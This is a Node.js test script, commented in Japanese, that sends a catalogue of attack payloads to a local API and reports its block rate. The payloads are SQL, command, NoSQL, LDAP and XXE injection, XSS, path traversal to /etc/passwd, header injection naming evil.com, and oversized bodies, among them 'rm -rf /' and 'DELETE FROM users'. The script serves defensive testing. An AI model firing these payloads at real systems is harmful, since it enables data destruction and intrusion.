/**
 * 不正なペイロード検出ブロック機能のテストスクリプト
 */

const axios = require('axios');

const API_BASE_URL = 'http://localhost:10000/api';

// 悪意のあるペイロードパターン
const maliciousPayloads = [
  // SQLインジェクション
  {
    category: "SQL Injection",
    payloads: [
      {
        name: "Union Select",
        data: { email: "test@example.com' UNION SELECT * FROM users--", password: "password" }
      },
      {
        name: "Time-based Blind",
        data: { email: "test@example.com' AND SLEEP(5)--", password: "password" }
      },
      {
        name: "Boolean-based",
        data: { email: "test@example.com' AND 1=1--", password: "password" }
      },
      {
        name: "Stacked Queries",
        data: { email: "test@example.com'; DELETE FROM users;--", password: "password" }
      }
    ]
  },
  
  // XSS攻撃
  {
    category: "XSS Attack",
    payloads: [
      {
        name: "Script Tag",
        data: { content: "<script>alert('XSS')</script>", postId: "1" }
      },
      {
        name: "Event Handler",
        data: { content: "<img src=x onerror='alert(1)'>", postId: "1" }
      },
      {
        name: "JavaScript Protocol",
        data: { content: "<a href='javascript:alert(1)'>click</a>", postId: "1" }
      },
      {
        name: "Data URI",
        data: { content: "<img src='data:text/html,<script>alert(1)</script>'>", postId: "1" }
      }
    ]
  },
  
  // コマンドインジェクション
  {
    category: "Command Injection",
    payloads: [
      {
        name: "Shell Command",
        data: { filename: "test.txt; rm -rf /", content: "data" }
      },
      {
        name: "Pipe Command",
        data: { search: "test | ls -la", category: "all" }
      },
      {
        name: "Backtick Command",
        data: { name: "`whoami`", value: "test" }
      },
      {
        name: "Command Substitution",
        data: { input: "$(cat /etc/passwd)", type: "text" }
      }
    ]
  },
  
  // パストラバーサル
  {
    category: "Path Traversal",
    payloads: [
      {
        name: "Directory Traversal",
        data: { file: "../../../etc/passwd", action: "read" }
      },
      {
        name: "Encoded Traversal",
        data: { path: "..%2F..%2F..%2Fetc%2Fpasswd", operation: "get" }
      },
      {
        name: "Double Encoding",
        data: { resource: "..%252F..%252F..%252Fetc%252Fpasswd", method: "access" }
      },
      {
        name: "Null Byte",
        data: { filename: "../../../etc/passwd%00.jpg", type: "image" }
      }
    ]
  },
  
  // XXE (XML External Entity)
  {
    category: "XXE Attack",
    payloads: [
      {
        name: "External Entity",
        data: { 
          xml: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
          type: "xml"
        }
      },
      {
        name: "Parameter Entity",
        data: {
          xml: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><root>test</root>',
          type: "xml"
        }
      }
    ]
  },
  
  // NoSQL Injection
  {
    category: "NoSQL Injection",
    payloads: [
      {
        name: "MongoDB Injection",
        data: { username: {"$ne": ""}, password: {"$ne": ""} }
      },
      {
        name: "Query Operator",
        data: { email: {"$regex": ".*"}, password: {"$gt": ""} }
      },
      {
        name: "JavaScript Injection",
        data: { query: "';return true;//", filter: "active" }
      }
    ]
  },
  
  // LDAP Injection
  {
    category: "LDAP Injection",
    payloads: [
      {
        name: "Basic LDAP",
        data: { username: "admin)(&(password=*))", password: "anything" }
      },
      {
        name: "Wildcard",
        data: { user: "*)(uid=*", pass: "test" }
      }
    ]
  },
  
  // 巨大ペイロード
  {
    category: "Large Payload",
    payloads: [
      {
        name: "Oversized String",
        data: { data: "A".repeat(1000000), type: "text" }
      },
      {
        name: "Deep Nesting",
        data: JSON.parse('{"a":'.repeat(1000) + '1' + '}'.repeat(1000))
      }
    ]
  }
];

// テストの実行
async function runPayloadTests() {
  console.log('=== 不正なペイロード検出テスト開始 ===\n');
  
  const results = {
    blocked: 0,
    passed: 0,
    errors: 0
  };

  for (const category of maliciousPayloads) {
    console.log(`\n【${category.category}】`);
    console.log('='.repeat(50));
    
    for (const payload of category.payloads) {
      console.log(`\nテスト: ${payload.name}`);
      console.log(`ペイロード: ${JSON.stringify(payload.data).substring(0, 100)}...`);
      
      try {
        // ログインエンドポイントでテスト
        if (payload.data.email || payload.data.username) {
          const response = await axios.post(`${API_BASE_URL}/auth/login`, payload.data, {
            timeout: 5000,
            validateStatus: () => true
          });
          
          if (response.status >= 400 && response.status < 500) {
            console.log(`✅ ブロック成功 (${response.status}): ${response.data.error || 'エラー'}`);
            results.blocked++;
          } else if (response.status >= 500) {
            console.log(`⚠️  サーバーエラー (${response.status})`);
            results.errors++;
          } else {
            console.log(`❌ 通過してしまった (${response.status})`);
            results.passed++;
          }
        }
        
        // コメントエンドポイントでテスト
        if (payload.data.content) {
          const response = await axios.post(`${API_BASE_URL}/comments`, payload.data, {
            timeout: 5000,
            validateStatus: () => true
          });
          
          if (response.status === 200 && response.data.content) {
            // サニタイズされているか確認
            const isSanitized = response.data.content !== payload.data.content;
            if (isSanitized) {
              console.log(`✅ サニタイズ成功: ${response.data.content.substring(0, 50)}...`);
              results.blocked++;
            } else {
              console.log(`❌ サニタイズされていない`);
              results.passed++;
            }
          }
        }
        
        // 検索エンドポイントでテスト
        if (payload.data.search || payload.data.query) {
          const searchParam = payload.data.search || payload.data.query;
          const response = await axios.get(`${API_BASE_URL}/influencers/search`, {
            params: { query: searchParam },
            timeout: 5000,
            validateStatus: () => true
          });
          
          if (response.status === 200) {
            console.log(`ℹ️  検索は正常に処理された (ペイロードは無害化されている可能性)`);
            results.blocked++;
          }
        }
        
      } catch (error) {
        if (error.code === 'ECONNABORTED') {
          console.log('✅ タイムアウト防御が機能 (攻撃がブロックされた)');
          results.blocked++;
        } else if (error.response) {
          console.log(`エラー応答 (${error.response.status}): ${error.response.data.error || 'Unknown'}`);
          results.errors++;
        } else {
          console.log(`ネットワークエラー: ${error.message}`);
          results.errors++;
        }
      }
    }
  }
  
  // 結果サマリー
  console.log('\n\n=== テスト結果サマリー ===');
  console.log(`✅ ブロック成功: ${results.blocked}`);
  console.log(`❌ 通過: ${results.passed}`);
  console.log(`⚠️  エラー: ${results.errors}`);
  console.log(`合計テスト数: ${results.blocked + results.passed + results.errors}`);
  
  const blockRate = (results.blocked / (results.blocked + results.passed + results.errors) * 100).toFixed(2);
  console.log(`\nブロック率: ${blockRate}%`);
  
  if (blockRate >= 90) {
    console.log('\n🎉 優秀: 90%以上の攻撃をブロックしています');
  } else if (blockRate >= 70) {
    console.log('\n⚠️  改善余地あり: より多くの攻撃パターンへの対策が必要です');
  } else {
    console.log('\n❌ 要改善: セキュリティ対策の強化が必要です');
  }
}

// リクエストサイズ制限のテスト
async function testPayloadSizeLimit() {
  console.log('\n\n=== ペイロードサイズ制限テスト ===\n');
  
  const sizes = [
    { size: 1000, name: "1KB" },
    { size: 10000, name: "10KB" },
    { size: 100000, name: "100KB" },
    { size: 1000000, name: "1MB" },
    { size: 10000000, name: "10MB" }
  ];
  
  for (const { size, name } of sizes) {
    try {
      const largeData = "X".repeat(size);
      const response = await axios.post(`${API_BASE_URL}/comments`, {
        content: largeData,
        postId: "test"
      }, {
        timeout: 10000,
        validateStatus: () => true,
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      });
      
      if (response.status === 413) {
        console.log(`✅ ${name}: ペイロードが大きすぎるため拒否されました`);
      } else if (response.status >= 400) {
        console.log(`✅ ${name}: エラーで拒否されました (${response.status})`);
      } else {
        console.log(`⚠️  ${name}: 受け入れられました (制限を確認してください)`);
      }
    } catch (error) {
      console.log(`✅ ${name}: エラーでブロックされました - ${error.message}`);
    }
  }
}

// ヘッダーインジェクションテスト
async function testHeaderInjection() {
  console.log('\n\n=== ヘッダーインジェクションテスト ===\n');
  
  const maliciousHeaders = [
    {
      name: "CRLF Injection",
      headers: {
        "X-Custom": "value\r\nX-Injected: malicious"
      }
    },
    {
      name: "Host Header Injection",
      headers: {
        "Host": "evil.com"
      }
    },
    {
      name: "X-Forwarded-For Spoofing",
      headers: {
        "X-Forwarded-For": "'; DROP TABLE users;--"
      }
    }
  ];
  
  for (const { name, headers } of maliciousHeaders) {
    try {
      console.log(`テスト: ${name}`);
      const response = await axios.get(`${API_BASE_URL}/health`, {
        headers,
        validateStatus: () => true
      });
      
      console.log(`レスポンス: ${response.status} - ヘッダー攻撃は通常のリクエストとして処理されました`);
    } catch (error) {
      console.log(`エラー: ${error.message}`);
    }
  }
}

// メイン実行
async function main() {
  try {
    await runPayloadTests();
    await testPayloadSizeLimit();
    await testHeaderInjection();
    
    console.log('\n\n=== 推奨事項 ===');
    console.log('1. 入力検証の強化: すべての入力に対して厳格な検証を実施');
    console.log('2. ペイロードサイズ制限: 適切なサイズ制限を設定');
    console.log('3. レート制限: 異常なリクエストパターンを検出してブロック');
    console.log('4. ログ監視: 攻撃試行を記録し、パターンを分析');
    console.log('5. WAF導入: より高度な攻撃パターンの検出と防御');
  } catch (error) {
    console.error('テスト実行エラー:', error);
  }
}

main();